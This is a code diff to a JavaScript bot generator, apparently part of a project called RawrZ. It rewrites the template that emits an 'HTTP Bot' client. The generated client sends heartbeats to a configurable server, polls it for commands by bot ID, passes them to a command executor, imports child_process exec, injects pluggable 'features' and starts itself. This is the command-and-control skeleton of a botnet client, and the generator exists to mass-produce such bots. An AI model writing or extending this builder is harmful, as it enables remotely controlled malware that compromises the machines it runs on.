@@ -461,112 +461,112 @@ class HTTPBotGenerator {
     generateJavaScriptHTTPBot(config, features, timestamp, botId) {
         const featureCode = this.generateJavaScriptFeatures(features);
         
-        return `// RawrZ HTTP Bot - JavaScript Implementation
-// Generated: ${timestamp}
-// Bot ID: ${botId}
-
-const https = require('https');
-const http = require('http');
-const { exec } = require('child_process');
-
-class RawrZHTTPBot {
-    constructor() {
-        this.serverUrl = "${config.server || 'http://localhost:8080'}";
-        this.botId = "${botId}";
-        this.botName = "${config.name || 'HTTPBot'}";
-        this.isRunning = false;
-    }
-    
-    async run() {
-        console.log(\"RawrZ HTTP Bot \${this.botId} starting...\");
-        this.isRunning = true;
-        
-        // Initialize features
-        ${featureCode.init}
-        
-        // Main bot loop
-        while (this.isRunning) {
-            try {
-                // Send heartbeat
-                await this.sendHeartbeat();
-                
-                // Check for commands
-                const command = await this.receiveCommand();
-                if (command) {
-                    await this.executeCommand(command);
-                }
-                
-                // Execute features
-                " + featureCode.execute + "
-                
-                await this.sleep(5000);
-            } catch (error) {
-                console.error('Error:', error);
-                await this.sleep(10000);
-            }
-        }
-    }
-    
-    async sendHeartbeat() {
-        const data = {
-            bot_id: this.botId,
-            status: 'alive',
-            timestamp: Date.now()
-        };
-        await this.sendHttpRequest('/bot/heartbeat', data);
-    }
-    
-    async receiveCommand() {
-        const response = await this.sendHttpRequest(\"/bot/commands/\${this.botId}\`, {});
-        return response;
-    }
-    
-    async executeCommand(command) {
-        console.log(\"Executing command: \" + command + "\");
-        // Command execution logic here
-    }
-    
-    async sendHttpRequest(endpoint, data) {
-        return new Promise((resolve, reject) => {
-            const url = this.serverUrl + endpoint;
-            const options = {
-                method: data ? 'POST' : 'GET',
-                headers: {
-                    'Content-Type': 'application/json'
-                }
-            };
-            
-            const req = http.request(url, options, (res) => {
-                let responseData = '';
-                res.on('data', (chunk) => {
-                    responseData += chunk;
-                });
-                res.on('end', () => {
-                    resolve(responseData);
-                });
-            });
-            
-            req.on('error', (error) => {
-                reject(error);
-            });
-            
-            if (data) {
-                req.write(JSON.stringify(data));
-            }
-            req.end();
-        });
-    }
-    
-    sleep(ms) {
-        return new Promise(resolve => setTimeout(resolve, ms));
-    }
-    
-    ${featureCode.methods}
-}
-
-// Start the bot
-const bot = new RawrZHTTPBot();
-bot.run().catch(console.error);`;
+        return '// RawrZ HTTP Bot - JavaScript Implementation\n' +
+            '// Generated: ' + timestamp + '\n' +
+            '// Bot ID: ' + botId + '\n' +
+            '\n' +
+            'const https = require(\'https\');\n' +
+            'const http = require(\'http\');\n' +
+            'const { exec } = require(\'child_process\');\n' +
+            '\n' +
+            'class RawrZHTTPBot {\n' +
+            '    constructor() {\n' +
+            '        this.serverUrl = "' + (config.server || 'http://localhost:8080') + '";\n' +
+            '        this.botId = "' + botId + '";\n' +
+            '        this.botName = "' + (config.name || 'HTTPBot') + '";\n' +
+            '        this.isRunning = false;\n' +
+            '    }\n' +
+            '    \n' +
+            '    async run() {\n' +
+            '        console.log("RawrZ HTTP Bot " + this.botId + " starting...");\n' +
+            '        this.isRunning = true;\n' +
+            '        \n' +
+            '        // Initialize features\n' +
+            '        ' + featureCode.init + '\n' +
+            '        \n' +
+            '        // Main bot loop\n' +
+            '        while (this.isRunning) {\n' +
+            '            try {\n' +
+            '                // Send heartbeat\n' +
+            '                await this.sendHeartbeat();\n' +
+            '                \n' +
+            '                // Check for commands\n' +
+            '                const command = await this.receiveCommand();\n' +
+            '                if (command) {\n' +
+            '                    await this.executeCommand(command);\n' +
+            '                }\n' +
+            '                \n' +
+            '                // Execute features\n' +
+            '                ' + featureCode.execute + '\n' +
+            '                \n' +
+            '                await this.sleep(5000);\n' +
+            '            } catch (error) {\n' +
+            '                console.error(\'Error:\', error);\n' +
+            '                await this.sleep(10000);\n' +
+            '            }\n' +
+            '        }\n' +
+            '    }\n' +
+            '    \n' +
+            '    async sendHeartbeat() {\n' +
+            '        const data = {\n' +
+            '            bot_id: this.botId,\n' +
+            '            status: \'alive\',\n' +
+            '            timestamp: Date.now()\n' +
+            '        };\n' +
+            '        await this.sendHttpRequest(\'/bot/heartbeat\', data);\n' +
+            '    }\n' +
+            '    \n' +
+            '    async receiveCommand() {\n' +
+            '        const response = await this.sendHttpRequest("/bot/commands/" + this.botId, {});\n' +
+            '        return response;\n' +
+            '    }\n' +
+            '    \n' +
+            '    async executeCommand(command) {\n' +
+            '        console.log("Executing command: " + command + "");\n' +
+            '        // Command execution logic here\n' +
+            '    }\n' +
+            '    \n' +
+            '    async sendHttpRequest(endpoint, data) {\n' +
+            '        return new Promise((resolve, reject) => {\n' +
+            '            const url = this.serverUrl + endpoint;\n' +
+            '            const options = {\n' +
+            '                method: data ? \'POST\' : \'GET\',\n' +
+            '                headers: {\n' +
+            '                    \'Content-Type\': \'application/json\'\n' +
+            '                }\n' +
+            '            };\n' +
+            '            \n' +
+            '            const req = http.request(url, options, (res) => {\n' +
+            '                let responseData = \'\';\n' +
+            '                res.on(\'data\', (chunk) => {\n' +
+            '                    responseData += chunk;\n' +
+            '                });\n' +
+            '                res.on(\'end\', () => {\n' +
+            '                    resolve(responseData);\n' +
+            '                });\n' +
+            '            });\n' +
+            '            \n' +
+            '            req.on(\'error\', (error) => {\n' +
+            '                reject(error);\n' +
+            '            });\n' +
+            '            \n' +
+            '            if (data) {\n' +
+            '                req.write(JSON.stringify(data));\n' +
+            '            }\n' +
+            '            req.end();\n' +
+            '        });\n' +
+            '    }\n' +
+            '    \n' +
+            '    sleep(ms) {\n' +
+            '        return new Promise(resolve => setTimeout(resolve, ms));\n' +
+            '    }\n' +
+            '    \n' +
+            '    ' + featureCode.methods + '\n' +
+            '}\n' +
+            '\n' +
+            '// Start the bot\n' +
+            'const bot = new RawrZHTTPBot();\n' +
+            'bot.run().catch(console.error);';
     }
 
     generateJavaScriptFeatures(features) {
